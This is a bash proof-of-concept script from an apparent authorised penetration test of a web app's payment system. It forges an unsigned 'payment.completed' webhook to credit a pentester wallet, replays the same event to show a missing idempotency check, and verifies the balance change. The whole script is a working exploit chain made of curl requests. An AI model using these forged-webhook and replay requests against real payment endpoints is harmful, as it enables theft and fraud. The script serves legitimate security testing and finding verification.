#!/usr/bin/env bash
# Chain C: Free money via unauthenticated payment webhook + idempotency absence
#   a06-f01 / a08-f02 / a10-f04 / a09-f08 (webhook accepts when signature header absent)
#   a06-f02 (no idempotency -> replay credits again)
# Target: pentester_free_1 wallet — credit arbitrary cents; then replay; confirm balance delta.

set -uo pipefail
set -a; source /tmp/tokens.env; set +a

TARGET="${TARGET_URL:-http://localhost:3000}"
VICTIM_ID="db734f89-16ba-482f-a127-fb649aabd099"   # pentester_free_1 (freelancer)
AMOUNT=50000                                       # 500.00

get_balance() {
  curl -s -H "Authorization: Bearer $FREELANCER" "$TARGET/api/payments/wallet" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('balance') or d.get('wallet',{}).get('balance'))"
}

new_uuid() { python3 -c 'import uuid; print(uuid.uuid4())'; }

echo "=== Chain C: Unauthenticated webhook -> wallet credit ==="
BEFORE=$(get_balance)
echo "[*] Balance before: $BEFORE"

REF1=$(new_uuid)
echo "--- Forge payment.completed event (no auth, no signature) ---"
curl -s -X POST "$TARGET/api/webhooks/payment" \
  -H 'Content-Type: application/json' \
  -d "{\"event\":\"payment.completed\",\"data\":{\"user_id\":\"$VICTIM_ID\",\"amount\":$AMOUNT,\"reference_id\":\"$REF1\",\"description\":\"pentest-forgery-1\"}}" \
  | head -c 200; echo

AFTER1=$(get_balance)
echo "[*] Balance after first forged credit: $AFTER1 (delta=$((AFTER1-BEFORE)))"

echo "--- Replay the SAME event (no idempotency check) ---"
curl -s -X POST "$TARGET/api/webhooks/payment" \
  -H 'Content-Type: application/json' \
  -d "{\"event\":\"payment.completed\",\"data\":{\"user_id\":\"$VICTIM_ID\",\"amount\":$AMOUNT,\"reference_id\":\"$REF1\",\"description\":\"pentest-forgery-replay\"}}" \
  | head -c 200; echo

AFTER2=$(get_balance)
echo "[*] Balance after replay: $AFTER2 (delta-since-start=$((AFTER2-BEFORE)))"

echo
echo "=== VERDICT ==="
DELTA=$((AFTER2-BEFORE))
EXPECTED=$((AMOUNT*2))
if (( DELTA >= EXPECTED )); then
  echo "PASS: credited $DELTA cents (>= 2 * $AMOUNT), proving unauthenticated webhook AND idempotency bypass."
  exit 0
else
  echo "FAIL: delta=$DELTA, expected >= $EXPECTED"
  exit 1
fi
